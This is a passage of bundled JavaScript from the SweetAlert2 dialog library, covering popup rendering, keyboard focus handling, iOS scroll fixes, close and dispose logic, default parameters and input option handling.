                        applyNumericalStyle(image, "width", params.imageWidth);
                        applyNumericalStyle(image, "height", params.imageHeight);
                        image.className = swalClasses.image;
                        applyCustomClass(image, params, "image");
                    };
                    const renderPopup = (instance, params) => {
                        const container = getContainer();
                        const popup = getPopup();
                        if (params.toast) {
                            applyNumericalStyle(container, "width", params.width);
                            popup.style.width = "100%";
                            popup.insertBefore(getLoader(), getIcon());
                        } else {
                            applyNumericalStyle(popup, "width", params.width);
                        }
                        applyNumericalStyle(popup, "padding", params.padding);
                        if (params.color) {
                            popup.style.color = params.color;
                        }
                        if (params.background) {
                            popup.style.background = params.background;
                        }
                        hide(getValidationMessage());
                        addClasses$1(popup, params);
                    };
                    const addClasses$1 = (popup, params) => {
                        popup.className = `${swalClasses.popup} ${isVisible$1(popup) ? params.showClass.popup : ""}`;
                        if (params.toast) {
                            addClass([document.documentElement, document.body], swalClasses["toast-shown"]);
                            addClass(popup, swalClasses.toast);
                        } else {
                            addClass(popup, swalClasses.modal);
                        }
                        applyCustomClass(popup, params, "popup");
                        if (typeof params.customClass === "string") {
                            addClass(popup, params.customClass);
                        }
                        if (params.icon) {
                            addClass(popup, swalClasses[`icon-${params.icon}`]);
                        }
                    };
                    const renderProgressSteps = (instance, params) => {
                        const progressStepsContainer = getProgressSteps();
                        if (!params.progressSteps || params.progressSteps.length === 0) {
                            hide(progressStepsContainer);
                            return;
                        }
                        show(progressStepsContainer);
                        progressStepsContainer.textContent = "";
                        if (params.currentProgressStep >= params.progressSteps.length) {
                            warn("Invalid currentProgressStep parameter, it should be less than progressSteps.length (currentProgressStep like JS arrays starts from 0)");
                        }
                        params.progressSteps.forEach((step, index) => {
                            const stepEl = createStepElement(step);
                            progressStepsContainer.appendChild(stepEl);
                            if (index === params.currentProgressStep) {
                                addClass(stepEl, swalClasses["active-progress-step"]);
                            }
                            if (index !== params.progressSteps.length - 1) {
                                const lineEl = createLineElement(params);
                                progressStepsContainer.appendChild(lineEl);
                            }
                        });
                    };
                    const createStepElement = (step) => {
                        const stepEl = document.createElement("li");
                        addClass(stepEl, swalClasses["progress-step"]);
                        setInnerHtml(stepEl, step);
                        return stepEl;
                    };
                    const createLineElement = (params) => {
                        const lineEl = document.createElement("li");
                        addClass(lineEl, swalClasses["progress-step-line"]);
                        if (params.progressStepsDistance) {
                            applyNumericalStyle(lineEl, "width", params.progressStepsDistance);
                        }
                        return lineEl;
                    };
                    const renderTitle = (instance, params) => {
                        const title = getTitle();
                        toggle(title, params.title || params.titleText, "block");
                        if (params.title) {
                            parseHtmlToContainer(params.title, title);
                        }
                        if (params.titleText) {
                            title.innerText = params.titleText;
                        }
                        applyCustomClass(title, params, "title");
                    };
                    const render = (instance, params) => {
                        renderPopup(instance, params);
                        renderContainer(instance, params);
                        renderProgressSteps(instance, params);
                        renderIcon(instance, params);
                        renderImage(instance, params);
                        renderTitle(instance, params);
                        renderCloseButton(instance, params);
                        renderContent(instance, params);
                        renderActions(instance, params);
                        renderFooter(instance, params);
                        if (typeof params.didRender === "function") {
                            params.didRender(getPopup());
                        }
                    };
                    function hideLoading() {
                        const innerParams = privateProps.innerParams.get(this);
                        if (!innerParams) {
                            return;
                        }
                        const domCache = privateProps.domCache.get(this);
                        hide(domCache.loader);
                        if (isToast()) {
                            if (innerParams.icon) {
                                show(getIcon());
                            }
                        } else {
                            showRelatedButton(domCache);
                        }
                        removeClass([domCache.popup, domCache.actions], swalClasses.loading);
                        domCache.popup.removeAttribute("aria-busy");
                        domCache.popup.removeAttribute("data-loading");
                        domCache.confirmButton.disabled = false;
                        domCache.denyButton.disabled = false;
                        domCache.cancelButton.disabled = false;
                    }
                    const showRelatedButton = (domCache) => {
                        const buttonToReplace = domCache.popup.getElementsByClassName(domCache.loader.getAttribute("data-button-to-replace"));
                        if (buttonToReplace.length) {
                            show(buttonToReplace[0], "inline-block");
                        } else if (allButtonsAreHidden()) {
                            hide(domCache.actions);
                        }
                    };
                    function getInput(instance) {
                        const innerParams = privateProps.innerParams.get(instance || this);
                        const domCache = privateProps.domCache.get(instance || this);
                        if (!domCache) {
                            return null;
                        }
                        return getInput$1(domCache.popup, innerParams.input);
                    }
                    const isVisible = () => {
                        return isVisible$1(getPopup());
                    };
                    const clickConfirm = () => getConfirmButton() && getConfirmButton().click();
                    const clickDeny = () => getDenyButton() && getDenyButton().click();
                    const clickCancel = () => getCancelButton() && getCancelButton().click();
                    const DismissReason = Object.freeze({
                        cancel: "cancel",
                        backdrop: "backdrop",
                        close: "close",
                        esc: "esc",
                        timer: "timer"
                    });
                    const removeKeydownHandler = (globalState2) => {
                        if (globalState2.keydownTarget && globalState2.keydownHandlerAdded) {
                            globalState2.keydownTarget.removeEventListener("keydown", globalState2.keydownHandler, {
                                capture: globalState2.keydownListenerCapture
                            });
                            globalState2.keydownHandlerAdded = false;
                        }
                    };
                    const addKeydownHandler = (instance, globalState2, innerParams, dismissWith) => {
                        removeKeydownHandler(globalState2);
                        if (!innerParams.toast) {
                            globalState2.keydownHandler = (e) => keydownHandler(instance, e, dismissWith);
                            globalState2.keydownTarget = innerParams.keydownListenerCapture ? window : getPopup();
                            globalState2.keydownListenerCapture = innerParams.keydownListenerCapture;
                            globalState2.keydownTarget.addEventListener("keydown", globalState2.keydownHandler, {
                                capture: globalState2.keydownListenerCapture
                            });
                            globalState2.keydownHandlerAdded = true;
                        }
                    };
                    const setFocus = (index, increment) => {
                        const focusableElements = getFocusableElements();
                        if (focusableElements.length) {
                            index = index + increment;
                            if (index === focusableElements.length) {
                                index = 0;
                            } else if (index === -1) {
                                index = focusableElements.length - 1;
                            }
                            focusableElements[index].focus();
                            return;
                        }
                        getPopup().focus();
                    };
                    const arrowKeysNextButton = ["ArrowRight", "ArrowDown"];
                    const arrowKeysPreviousButton = ["ArrowLeft", "ArrowUp"];
                    const keydownHandler = (instance, event, dismissWith) => {
                        const innerParams = privateProps.innerParams.get(instance);
                        if (!innerParams) {
                            return;
                        }
                        if (event.isComposing || event.keyCode === 229) {
                            return;
                        }
                        if (innerParams.stopKeydownPropagation) {
                            event.stopPropagation();
                        }
                        if (event.key === "Enter") {
                            handleEnter(instance, event, innerParams);
                        } else if (event.key === "Tab") {
                            handleTab(event);
                        } else if ([...arrowKeysNextButton, ...arrowKeysPreviousButton].includes(event.key)) {
                            handleArrows(event.key);
                        } else if (event.key === "Escape") {
                            handleEsc(event, innerParams, dismissWith);
                        }
                    };
                    const handleEnter = (instance, event, innerParams) => {
                        if (!callIfFunction(innerParams.allowEnterKey)) {
                            return;
                        }
                        if (event.target && instance.getInput() && event.target instanceof HTMLElement && event.target.outerHTML === instance.getInput().outerHTML) {
                            if (["textarea", "file"].includes(innerParams.input)) {
                                return;
                            }
                            clickConfirm();
                            event.preventDefault();
                        }
                    };
                    const handleTab = (event) => {
                        const targetElement = event.target;
                        const focusableElements = getFocusableElements();
                        let btnIndex = -1;
                        for (let i = 0; i < focusableElements.length; i++) {
                            if (targetElement === focusableElements[i]) {
                                btnIndex = i;
                                break;
                            }
                        }
                        if (!event.shiftKey) {
                            setFocus(btnIndex, 1);
                        } else {
                            setFocus(btnIndex, -1);
                        }
                        event.stopPropagation();
                        event.preventDefault();
                    };
                    const handleArrows = (key) => {
                        const confirmButton = getConfirmButton();
                        const denyButton = getDenyButton();
                        const cancelButton = getCancelButton();
                        const buttons = [confirmButton, denyButton, cancelButton];
                        if (document.activeElement instanceof HTMLElement && !buttons.includes(document.activeElement)) {
                            return;
                        }
                        const sibling = arrowKeysNextButton.includes(key) ? "nextElementSibling" : "previousElementSibling";
                        let buttonToFocus = document.activeElement;
                        for (let i = 0; i < getActions().children.length; i++) {
                            buttonToFocus = buttonToFocus[sibling];
                            if (!buttonToFocus) {
                                return;
                            }
                            if (buttonToFocus instanceof HTMLButtonElement && isVisible$1(buttonToFocus)) {
                                break;
                            }
                        }
                        if (buttonToFocus instanceof HTMLButtonElement) {
                            buttonToFocus.focus();
                        }
                    };
                    const handleEsc = (event, innerParams, dismissWith) => {
                        if (callIfFunction(innerParams.allowEscapeKey)) {
                            event.preventDefault();
                            dismissWith(DismissReason.esc);
                        }
                    };
                    var privateMethods = {
                        swalPromiseResolve: /* @__PURE__ */ new WeakMap(),
                        swalPromiseReject: /* @__PURE__ */ new WeakMap()
                    };
                    const setAriaHidden = () => {
                        const bodyChildren = Array.from(document.body.children);
                        bodyChildren.forEach((el) => {
                            if (el === getContainer() || el.contains(getContainer())) {
                                return;
                            }
                            if (el.hasAttribute("aria-hidden")) {
                                el.setAttribute("data-previous-aria-hidden", el.getAttribute("aria-hidden"));
                            }
                            el.setAttribute("aria-hidden", "true");
                        });
                    };
                    const unsetAriaHidden = () => {
                        const bodyChildren = Array.from(document.body.children);
                        bodyChildren.forEach((el) => {
                            if (el.hasAttribute("data-previous-aria-hidden")) {
                                el.setAttribute("aria-hidden", el.getAttribute("data-previous-aria-hidden"));
                                el.removeAttribute("data-previous-aria-hidden");
                            } else {
                                el.removeAttribute("aria-hidden");
                            }
                        });
                    };
                    const iOSfix = () => {
                        const iOS = (
                            // @ts-ignore
                            /iPad|iPhone|iPod/.test(navigator.userAgent) && !window.MSStream || navigator.platform === "MacIntel" && navigator.maxTouchPoints > 1
                        );
                        if (iOS && !hasClass(document.body, swalClasses.iosfix)) {
                            const offset = document.body.scrollTop;
                            document.body.style.top = `${offset * -1}px`;
                            addClass(document.body, swalClasses.iosfix);
                            lockBodyScroll();
                            addBottomPaddingForTallPopups();
                        }
                    };
                    const addBottomPaddingForTallPopups = () => {
                        const ua = navigator.userAgent;
                        const iOS = !!ua.match(/iPad/i) || !!ua.match(/iPhone/i);
                        const webkit = !!ua.match(/WebKit/i);
                        const iOSSafari = iOS && webkit && !ua.match(/CriOS/i);
                        if (iOSSafari) {
                            const bottomPanelHeight = 44;
                            if (getPopup().scrollHeight > window.innerHeight - bottomPanelHeight) {
                                getContainer().style.paddingBottom = `${bottomPanelHeight}px`;
                            }
                        }
                    };
                    const lockBodyScroll = () => {
                        const container = getContainer();
                        let preventTouchMove;
                        container.ontouchstart = (event) => {
                            preventTouchMove = shouldPreventTouchMove(event);
                        };
                        container.ontouchmove = (event) => {
                            if (preventTouchMove) {
                                event.preventDefault();
                                event.stopPropagation();
                            }
                        };
                    };
                    const shouldPreventTouchMove = (event) => {
                        const target = event.target;
                        const container = getContainer();
                        if (isStylus(event) || isZoom(event)) {
                            return false;
                        }
                        if (target === container) {
                            return true;
                        }
                        if (!isScrollable(container) && target instanceof HTMLElement && target.tagName !== "INPUT" && // #1603
                            target.tagName !== "TEXTAREA" && // #2266
                            !(isScrollable(getHtmlContainer()) && // #1944
                                getHtmlContainer().contains(target))) {
                            return true;
                        }
                        return false;
                    };
                    const isStylus = (event) => {
                        return event.touches && event.touches.length && event.touches[0].touchType === "stylus";
                    };
                    const isZoom = (event) => {
                        return event.touches && event.touches.length > 1;
                    };
                    const undoIOSfix = () => {
                        if (hasClass(document.body, swalClasses.iosfix)) {
                            const offset = parseInt(document.body.style.top, 10);
                            removeClass(document.body, swalClasses.iosfix);
                            document.body.style.top = "";
                            document.body.scrollTop = offset * -1;
                        }
                    };
                    const fixScrollbar = () => {
                        if (states.previousBodyPadding !== null) {
                            return;
                        }
                        if (document.body.scrollHeight > window.innerHeight) {
                            states.previousBodyPadding = parseInt(window.getComputedStyle(document.body).getPropertyValue("padding-right"));
                            document.body.style.paddingRight = `${states.previousBodyPadding + measureScrollbar()}px`;
                        }
                    };
                    const undoScrollbar = () => {
                        if (states.previousBodyPadding !== null) {
                            document.body.style.paddingRight = `${states.previousBodyPadding}px`;
                            states.previousBodyPadding = null;
                        }
                    };
                    function removePopupAndResetState(instance, container, returnFocus, didClose) {
                        if (isToast()) {
                            triggerDidCloseAndDispose(instance, didClose);
                        } else {
                            restoreActiveElement(returnFocus).then(() => triggerDidCloseAndDispose(instance, didClose));
                            removeKeydownHandler(globalState);
                        }
                        const isSafari = /^((?!chrome|android).)*safari/i.test(navigator.userAgent);
                        if (isSafari) {
                            container.setAttribute("style", "display:none !important");
                            container.removeAttribute("class");
                            container.innerHTML = "";
                        } else {
                            container.remove();
                        }
                        if (isModal()) {
                            undoScrollbar();
                            undoIOSfix();
                            unsetAriaHidden();
                        }
                        removeBodyClasses();
                    }
                    function removeBodyClasses() {
                        removeClass([document.documentElement, document.body], [swalClasses.shown, swalClasses["height-auto"], swalClasses["no-backdrop"], swalClasses["toast-shown"]]);
                    }
                    function close(resolveValue) {
                        resolveValue = prepareResolveValue(resolveValue);
                        const swalPromiseResolve = privateMethods.swalPromiseResolve.get(this);
                        const didClose = triggerClosePopup(this);
                        if (this.isAwaitingPromise()) {
                            if (!resolveValue.isDismissed) {
                                handleAwaitingPromise(this);
                                swalPromiseResolve(resolveValue);
                            }
                        } else if (didClose) {
                            swalPromiseResolve(resolveValue);
                        }
                    }
                    function isAwaitingPromise() {
                        return !!privateProps.awaitingPromise.get(this);
                    }
                    const triggerClosePopup = (instance) => {
                        const popup = getPopup();
                        if (!popup) {
                            return false;
                        }
                        const innerParams = privateProps.innerParams.get(instance);
                        if (!innerParams || hasClass(popup, innerParams.hideClass.popup)) {
                            return false;
                        }
                        removeClass(popup, innerParams.showClass.popup);
                        addClass(popup, innerParams.hideClass.popup);
                        const backdrop = getContainer();
                        removeClass(backdrop, innerParams.showClass.backdrop);
                        addClass(backdrop, innerParams.hideClass.backdrop);
                        handlePopupAnimation(instance, popup, innerParams);
                        return true;
                    };
                    function rejectPromise(error2) {
                        const rejectPromise2 = privateMethods.swalPromiseReject.get(this);
                        handleAwaitingPromise(this);
                        if (rejectPromise2) {
                            rejectPromise2(error2);
                        }
                    }
                    const handleAwaitingPromise = (instance) => {
                        if (instance.isAwaitingPromise()) {
                            privateProps.awaitingPromise.delete(instance);
                            if (!privateProps.innerParams.get(instance)) {
                                instance._destroy();
                            }
                        }
                    };
                    const prepareResolveValue = (resolveValue) => {
                        if (typeof resolveValue === "undefined") {
                            return {
                                isConfirmed: false,
                                isDenied: false,
                                isDismissed: true
                            };
                        }
                        return Object.assign({
                            isConfirmed: false,
                            isDenied: false,
                            isDismissed: false
                        }, resolveValue);
                    };
                    const handlePopupAnimation = (instance, popup, innerParams) => {
                        const container = getContainer();
                        const animationIsSupported = animationEndEvent && hasCssAnimation(popup);
                        if (typeof innerParams.willClose === "function") {
                            innerParams.willClose(popup);
                        }
                        if (animationIsSupported) {
                            animatePopup(instance, popup, container, innerParams.returnFocus, innerParams.didClose);
                        } else {
                            removePopupAndResetState(instance, container, innerParams.returnFocus, innerParams.didClose);
                        }
                    };
                    const animatePopup = (instance, popup, container, returnFocus, didClose) => {
                        globalState.swalCloseEventFinishedCallback = removePopupAndResetState.bind(null, instance, container, returnFocus, didClose);
                        popup.addEventListener(animationEndEvent, function(e) {
                            if (e.target === popup) {
                                globalState.swalCloseEventFinishedCallback();
                                delete globalState.swalCloseEventFinishedCallback;
                            }
                        });
                    };
                    const triggerDidCloseAndDispose = (instance, didClose) => {
                        setTimeout(() => {
                            if (typeof didClose === "function") {
                                didClose.bind(instance.params)();
                            }
                            instance._destroy();
                        });
                    };
                    function setButtonsDisabled(instance, buttons, disabled) {
                        const domCache = privateProps.domCache.get(instance);
                        buttons.forEach((button) => {
                            domCache[button].disabled = disabled;
                        });
                    }
                    function setInputDisabled(input, disabled) {
                        if (!input) {
                            return;
                        }
                        if (input.type === "radio") {
                            const radiosContainer = input.parentNode.parentNode;
                            const radios = radiosContainer.querySelectorAll("input");
                            for (let i = 0; i < radios.length; i++) {
                                radios[i].disabled = disabled;
                            }
                        } else {
                            input.disabled = disabled;
                        }
                    }
                    function enableButtons() {
                        setButtonsDisabled(this, ["confirmButton", "denyButton", "cancelButton"], false);
                    }
                    function disableButtons() {
                        setButtonsDisabled(this, ["confirmButton", "denyButton", "cancelButton"], true);
                    }
                    function enableInput() {
                        setInputDisabled(this.getInput(), false);
                    }
                    function disableInput() {
                        setInputDisabled(this.getInput(), true);
                    }
                    function showValidationMessage(error2) {
                        const domCache = privateProps.domCache.get(this);
                        const params = privateProps.innerParams.get(this);
                        setInnerHtml(domCache.validationMessage, error2);
                        domCache.validationMessage.className = swalClasses["validation-message"];
                        if (params.customClass && params.customClass.validationMessage) {
                            addClass(domCache.validationMessage, params.customClass.validationMessage);
                        }
                        show(domCache.validationMessage);
                        const input = this.getInput();
                        if (input) {
                            input.setAttribute("aria-invalid", true);
                            input.setAttribute("aria-describedby", swalClasses["validation-message"]);
                            focusInput(input);
                            addClass(input, swalClasses.inputerror);
                        }
                    }
                    function resetValidationMessage() {
                        const domCache = privateProps.domCache.get(this);
                        if (domCache.validationMessage) {
                            hide(domCache.validationMessage);
                        }
                        const input = this.getInput();
                        if (input) {
                            input.removeAttribute("aria-invalid");
                            input.removeAttribute("aria-describedby");
                            removeClass(input, swalClasses.inputerror);
                        }
                    }
                    const defaultParams = {
                        title: "",
                        titleText: "",
                        text: "",
                        html: "",
                        footer: "",
                        icon: void 0,
                        iconColor: void 0,
                        iconHtml: void 0,
                        template: void 0,
                        toast: false,
                        showClass: {
                            popup: "swal2-show",
                            backdrop: "swal2-backdrop-show",
                            icon: "swal2-icon-show"
                        },
                        hideClass: {
                            popup: "swal2-hide",
                            backdrop: "swal2-backdrop-hide",
                            icon: "swal2-icon-hide"
                        },
                        customClass: {},
                        target: "body",
                        color: void 0,
                        backdrop: true,
                        heightAuto: true,
                        allowOutsideClick: true,
                        allowEscapeKey: true,
                        allowEnterKey: true,
                        stopKeydownPropagation: true,
                        keydownListenerCapture: false,
                        showConfirmButton: true,
                        showDenyButton: false,
                        showCancelButton: false,
                        preConfirm: void 0,
                        preDeny: void 0,
                        confirmButtonText: "OK",
                        confirmButtonAriaLabel: "",
                        confirmButtonColor: void 0,
                        denyButtonText: "No",
                        denyButtonAriaLabel: "",
                        denyButtonColor: void 0,
                        cancelButtonText: "Cancel",
                        cancelButtonAriaLabel: "",
                        cancelButtonColor: void 0,
                        buttonsStyling: true,
                        reverseButtons: false,
                        focusConfirm: true,
                        focusDeny: false,
                        focusCancel: false,
                        returnFocus: true,
                        showCloseButton: false,
                        closeButtonHtml: "&times;",
                        closeButtonAriaLabel: "Close this dialog",
                        loaderHtml: "",
                        showLoaderOnConfirm: false,
                        showLoaderOnDeny: false,
                        imageUrl: void 0,
                        imageWidth: void 0,
                        imageHeight: void 0,
                        imageAlt: "",
                        timer: void 0,
                        timerProgressBar: false,
                        width: void 0,
                        padding: void 0,
                        background: void 0,
                        input: void 0,
                        inputPlaceholder: "",
                        inputLabel: "",
                        inputValue: "",
                        inputOptions: {},
                        inputAutoFocus: true,
                        inputAutoTrim: true,
                        inputAttributes: {},
                        inputValidator: void 0,
                        returnInputValueOnDeny: false,
                        validationMessage: void 0,
                        grow: false,
                        position: "center",
                        progressSteps: [],
                        currentProgressStep: void 0,
                        progressStepsDistance: void 0,
                        willOpen: void 0,
                        didOpen: void 0,
                        didRender: void 0,
                        willClose: void 0,
                        didClose: void 0,
                        didDestroy: void 0,
                        scrollbarPadding: true
                    };
                    const updatableParams = ["allowEscapeKey", "allowOutsideClick", "background", "buttonsStyling", "cancelButtonAriaLabel", "cancelButtonColor", "cancelButtonText", "closeButtonAriaLabel", "closeButtonHtml", "color", "confirmButtonAriaLabel", "confirmButtonColor", "confirmButtonText", "currentProgressStep", "customClass", "denyButtonAriaLabel", "denyButtonColor", "denyButtonText", "didClose", "didDestroy", "footer", "hideClass", "html", "icon", "iconColor", "iconHtml", "imageAlt", "imageHeight", "imageUrl", "imageWidth", "preConfirm", "preDeny", "progressSteps", "returnFocus", "reverseButtons", "showCancelButton", "showCloseButton", "showConfirmButton", "showDenyButton", "text", "title", "titleText", "willClose"];
                    const deprecatedParams = {};
                    const toastIncompatibleParams = ["allowOutsideClick", "allowEnterKey", "backdrop", "focusConfirm", "focusDeny", "focusCancel", "returnFocus", "heightAuto", "keydownListenerCapture"];
                    const isValidParameter = (paramName) => {
                        return Object.prototype.hasOwnProperty.call(defaultParams, paramName);
                    };
                    const isUpdatableParameter = (paramName) => {
                        return updatableParams.indexOf(paramName) !== -1;
                    };
                    const isDeprecatedParameter = (paramName) => {
                        return deprecatedParams[paramName];
                    };
                    const checkIfParamIsValid = (param) => {
                        if (!isValidParameter(param)) {
                            warn(`Unknown parameter "${param}"`);
                        }
                    };
                    const checkIfToastParamIsValid = (param) => {
                        if (toastIncompatibleParams.includes(param)) {
                            warn(`The parameter "${param}" is incompatible with toasts`);
                        }
                    };
                    const checkIfParamIsDeprecated = (param) => {
                        if (isDeprecatedParameter(param)) {
                            warnAboutDeprecation(param, isDeprecatedParameter(param));
                        }
                    };
                    const showWarningsForParams = (params) => {
                        if (params.backdrop === false && params.allowOutsideClick) {
                            warn('"allowOutsideClick" parameter requires `backdrop` parameter to be set to `true`');
                        }
                        for (const param in params) {
                            checkIfParamIsValid(param);
                            if (params.toast) {
                                checkIfToastParamIsValid(param);
                            }
                            checkIfParamIsDeprecated(param);
                        }
                    };
                    function update(params) {
                        const popup = getPopup();
                        const innerParams = privateProps.innerParams.get(this);
                        if (!popup || hasClass(popup, innerParams.hideClass.popup)) {
                            warn(`You're trying to update the closed or closing popup, that won't work. Use the update() method in preConfirm parameter or show a new popup.`);
                            return;
                        }
                        const validUpdatableParams = filterValidParams(params);
                        const updatedParams = Object.assign({}, innerParams, validUpdatableParams);
                        render(this, updatedParams);
                        privateProps.innerParams.set(this, updatedParams);
                        Object.defineProperties(this, {
                            params: {
                                value: Object.assign({}, this.params, params),
                                writable: false,
                                enumerable: true
                            }
                        });
                    }
                    const filterValidParams = (params) => {
                        const validUpdatableParams = {};
                        Object.keys(params).forEach((param) => {
                            if (isUpdatableParameter(param)) {
                                validUpdatableParams[param] = params[param];
                            } else {
                                warn(`Invalid parameter to update: ${param}`);
                            }
                        });
                        return validUpdatableParams;
                    };
                    function _destroy() {
                        const domCache = privateProps.domCache.get(this);
                        const innerParams = privateProps.innerParams.get(this);
                        if (!innerParams) {
                            disposeWeakMaps(this);
                            return;
                        }
                        if (domCache.popup && globalState.swalCloseEventFinishedCallback) {
                            globalState.swalCloseEventFinishedCallback();
                            delete globalState.swalCloseEventFinishedCallback;
                        }
                        if (typeof innerParams.didDestroy === "function") {
                            innerParams.didDestroy();
                        }
                        disposeSwal(this);
                    }
                    const disposeSwal = (instance) => {
                        disposeWeakMaps(instance);
                        delete instance.params;
                        delete globalState.keydownHandler;
                        delete globalState.keydownTarget;
                        delete globalState.currentInstance;
                    };
                    const disposeWeakMaps = (instance) => {
                        if (instance.isAwaitingPromise()) {
                            unsetWeakMaps(privateProps, instance);
                            privateProps.awaitingPromise.set(instance, true);
                        } else {
                            unsetWeakMaps(privateMethods, instance);
                            unsetWeakMaps(privateProps, instance);
                        }
                    };
                    const unsetWeakMaps = (obj, instance) => {
                        for (const i in obj) {
                            obj[i].delete(instance);
                        }
                    };
                    var instanceMethods = /* @__PURE__ */ Object.freeze({
                        __proto__: null,
                        _destroy,
                        close,
                        closeModal: close,
                        closePopup: close,
                        closeToast: close,
                        disableButtons,
                        disableInput,
                        disableLoading: hideLoading,
                        enableButtons,
                        enableInput,
                        getInput,
                        handleAwaitingPromise,
                        hideLoading,
                        isAwaitingPromise,
                        rejectPromise,
                        resetValidationMessage,
                        showValidationMessage,
                        update
                    });
                    const showLoading = (buttonToReplace) => {
                        let popup = getPopup();
                        if (!popup) {
                            new Swal3();
                        }
                        popup = getPopup();
                        const loader = getLoader();
                        if (isToast()) {
                            hide(getIcon());
                        } else {
                            replaceButton(popup, buttonToReplace);
                        }
                        show(loader);
                        popup.setAttribute("data-loading", "true");
                        popup.setAttribute("aria-busy", "true");
                        popup.focus();
                    };
                    const replaceButton = (popup, buttonToReplace) => {
                        const actions = getActions();
                        const loader = getLoader();
                        if (!buttonToReplace && isVisible$1(getConfirmButton())) {
                            buttonToReplace = getConfirmButton();
                        }
                        show(actions);
                        if (buttonToReplace) {
                            hide(buttonToReplace);
                            loader.setAttribute("data-button-to-replace", buttonToReplace.className);
                        }
                        loader.parentNode.insertBefore(loader, buttonToReplace);
                        addClass([popup, actions], swalClasses.loading);
                    };
                    const handleInputOptionsAndValue = (instance, params) => {
                        if (params.input === "select" || params.input === "radio") {
                            handleInputOptions(instance, params);
                        } else if (["text", "email", "number", "tel", "textarea"].includes(params.input) && (hasToPromiseFn(params.inputValue) || isPromise(params.inputValue))) {
                            showLoading(getConfirmButton());
                            handleInputValue(instance, params);
                        }
                    };
                    const getInputValue = (instance, innerParams) => {
                        const input = instance.getInput();
                        if (!input) {
                            return null;
                        }
                        switch (innerParams.input) {
                            case "checkbox":
                                return getCheckboxValue(input);
                            case "radio":
                                return getRadioValue(input);
                            case "file":
                                return getFileValue(input);
                            default:
                                return innerParams.inputAutoTrim ? input.value.trim() : input.value;
                        }
                    };
                    const getCheckboxValue = (input) => input.checked ? 1 : 0;
                    const getRadioValue = (input) => input.checked ? input.value : null;
                    const getFileValue = (input) => input.files.length ? input.getAttribute("multiple") !== null ? input.files : input.files[0] : null;
                    const handleInputOptions = (instance, params) => {
                        const popup = getPopup();
                        const processInputOptions = (inputOptions) => {
                            populateInputOptions[params.input](popup, formatInputOptions(inputOptions), params);
                        };
                        if (hasToPromiseFn(params.inputOptions) || isPromise(params.inputOptions)) {
                            showLoading(getConfirmButton());
                            asPromise(params.inputOptions).then((inputOptions) => {
                                instance.hideLoading();
                                processInputOptions(inputOptions);
                            });
                        } else if (typeof params.inputOptions === "object") {
                            processInputOptions(params.inputOptions);
                        } else {
                            error(`Unexpected type of inputOptions! Expected object, Map or Promise, got ${typeof params.inputOptions}`);
                        }
                    };
                    const handleInputValue = (instance, params) => {
                        const input = instance.getInput();
                        hide(input);
                        asPromise(params.inputValue).then((inputValue) => {
                            input.value = params.input === "number" ? `${parseFloat(inputValue) || 0}` : `${inputValue}`;
                            show(input);
                            input.focus();
                            instance.hideLoading();
                        }).catch((err) => {
                            error(`Error in inputValue promise: ${err}`);
                            input.value = "";
                            show(input);
                            input.focus();
                            instance.hideLoading();
                        });
                    };
                    const populateInputOptions = {
                        /**
                         * @param {HTMLElement} popup
                         * @param {Record<string, any>} inputOptions
                         * @param {SweetAlertOptions} params
                         */
                        select: (popup, inputOptions, params) => {
                            const select = getDirectChildByClass(popup, swalClasses.select);
                            const renderOption = (parent, optionLabel, optionValue) => {
                                const option = document.createElement("option");
                                option.value = optionValue;
                                setInnerHtml(option, optionLabel);
                                option.selected = isSelected(optionValue, params.inputValue);
                                parent.appendChild(option);
                            };
                            inputOptions.forEach((inputOption) => {
                                const optionValue = inputOption[0];
                                const optionLabel = inputOption[1];
                                if (Array.isArray(optionLabel)) {
                                    const optgroup = document.createElement("optgroup");
                                    optgroup.label = optionValue;
                                    optgroup.disabled = false;
                                    select.appendChild(optgroup);
                                    optionLabel.forEach((o) => renderOption(optgroup, o[1], o[0]));
                                } else {
                                    renderOption(select, optionLabel, optionValue);
                                }
                            });
                            select.focus();
                        },
                        /**
                         * @param {HTMLElement} popup
                         * @param {Record<string, any>} inputOptions
                         * @param {SweetAlertOptions} params
                         */
                        radio: (popup, inputOptions, params) => {
                            const radio = getDirectChildByClass(popup, swalClasses.radio);
                            inputOptions.forEach((inputOption) => {
                                const radioValue = inputOption[0];
                                const radioLabel = inputOption[1];
                                const radioInput = document.createElement("input");
                                const radioLabelElement = document.createElement("label");
                                radioInput.type = "radio";
                                radioInput.name = swalClasses.radio;
                                radioInput.value = radioValue;
                                if (isSelected(radioValue, params.inputValue)) {
                                    radioInput.checked = true;
                                }
                                const label = document.createElement("span");
                                setInnerHtml(label, radioLabel);
                                label.className = swalClasses.label;
                                radioLabelElement.appendChild(radioInput);
                                radioLabelElement.appendChild(label);
                                radio.appendChild(radioLabelElement);
                            });
                            const radios = radio.querySelectorAll("input");
                            if (radios.length) {
                                radios[0].focus();
                            }
                        }
                    };
                    const formatInputOptions = (inputOptions) => {
                        const result = [];
                        if (typeof Map !== "undefined" && inputOptions instanceof Map) {
                            inputOptions.forEach((value, key) => {
                                let valueFormatted = value;
                                if (typeof valueFormatted === "object") {
                                    valueFormatted = formatInputOptions(valueFormatted);
                                }
                                result.push([key, valueFormatted]);
                            });
                        } else {
                            Object.keys(inputOptions).forEach((key) => {
                                let valueFormatted = inputOptions[key];
                                if (typeof valueFormatted === "object") {
                                    valueFormatted = formatInputOptions(valueFormatted);
                                }
                                result.push([key, valueFormatted]);
                            });
                        }
                        return result;
                    };
                    const isSelected = (optionValue, inputValue) => {
                        return inputValue && inputValue.toString() === optionValue.toString();
                    };
                    const handleConfirmButtonClick = (instance) => {
                        const innerParams = privateProps.innerParams.get(instance);
                        instance.disableButtons();
                        if (innerParams.input) {
                            handleConfirmOrDenyWithInput(instance, "confirm");
                        } else {
                            confirm(instance, true);
                        }
                    };
                    const handleDenyButtonClick = (instance) => {
                        const innerParams = privateProps.innerParams.get(instance);
                        instance.disableButtons();
                        if (innerParams.returnInputValueOnDeny) {
                            handleConfirmOrDenyWithInput(instance, "deny");
                        } else {
                            deny(instance, false);
                        }
                    };
                    const handleCancelButtonClick = (instance, dismissWith) => {
                        instance.disableButtons();
                        dismissWith(DismissReason.cancel);
                    };
                    const handleConfirmOrDenyWithInput = (instance, type) => {
                        const innerParams = privateProps.innerParams.get(instance);
                        if (!innerParams.input) {
                            error(`The "input" parameter is needed to be set when using returnInputValueOn${capitalizeFirstLetter(type)}`);
                            return;
                        }
                        const inputValue = getInputValue(instance, innerParams);
                        if (innerParams.inputValidator) {
                            handleInputValidator(instance, inputValue, type);
                        } else if (!instance.getInput().checkValidity()) {
                            instance.enableButtons();
                            instance.showValidationMessage(innerParams.validationMessage);
                        } else if (type === "deny") {
